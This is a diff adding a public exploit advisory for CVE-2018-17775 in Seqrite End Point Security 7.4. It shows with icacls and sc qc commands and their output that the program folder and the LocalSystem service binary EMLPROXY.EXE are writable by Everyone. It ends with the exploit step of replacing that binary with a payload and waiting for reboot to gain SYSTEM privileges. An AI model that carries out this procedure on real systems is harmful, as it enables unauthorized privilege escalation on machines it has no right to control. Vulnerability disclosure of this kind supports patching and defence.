@@ -1,0 +1,65 @@
+# Exploit Title: Seqrite End Point Security 7.4 - Privilege Escalation
+# Date: 2018-09-13
+# Exploit Author: Hashim Jawad - @ihack4falafel
+# Vendor Homepage: https://www.seqrite.com/
+# Tested on: Windows 7 Enterprise SP1 (x64)
+# CVE: CVE-2018-17775
+
+# Description:
+# Seqrite End Point Security v7.4 installs by default to "C:\Program Files\Seqrite\Seqrite" 
+# with very weak folder permissions granting any user full permission "Everyone: (F)" 
+# to the contents of the directory and it's subfolders. In addition, the program installs handful 
+# of services with binaries within the program folder that run as "LocalSystem". Given 
+# the "Self Protection" feature (on by default) is disabled which can be done in number of ways 
+#(for instance, if the policy does not enforce EPS client password to change the settings any user 
+# can disable that feature), meaning a non-privileged user would be able to 
+# elevate privileges to "NT AUTHORITY\SYSTEM".
+
+# PoC
+
+c:\>icacls "c:\Program Files\Seqrite\Seqrite"
+c:\Program Files\Seqrite\Seqrite Everyone:(OI)(IO)(F)
+                                 Everyone:(CI)(F)
+                                 NT SERVICE\TrustedInstaller:(I)(CI)(IO)(F)
+                                 NT AUTHORITY\SYSTEM:(I)(F)
+                                 NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
+                                 BUILTIN\Administrators:(I)(F)
+                                 BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
+                                 BUILTIN\Users:(I)(RX)
+                                 BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
+                                 CREATOR OWNER:(I)(OI)(CI)(IO)(F)
+                                 APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
+                                 APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)
+                                 APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
+                                 APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)
+
+Successfully processed 1 files; Failed processing 0 files
+
+c:\>sc qc "Core Mail Protection"
+
+[SC] QueryServiceConfig SUCCESS
+SERVICE_NAME: Core Mail Protection
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : "C:\Program Files\Seqrite\Seqrite\EMLPROXY.EXE"
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : Core Mail Protection
+        DEPENDENCIES       :
+        SERVICE_START_NAME : LocalSystem
+
+c:\>icacls "C:\Program Files\Seqrite\Seqrite\EMLPROXY.EXE"
+C:\Program Files\Seqrite\Seqrite\EMLPROXY.EXE Everyone:(I)(F)
+                                              NT AUTHORITY\SYSTEM:(I)(F)
+                                              BUILTIN\Administrators:(I)(F)
+                                              BUILTIN\Users:(I)(RX)
+                                              APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
+                                              APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
+
+Successfully processed 1 files; Failed processing 0 files
+c:\>
+
+# Exploit:
+
+Simply replace "EMLPROXY.EXE" with your preferred payload and wait for execution upon reboot.
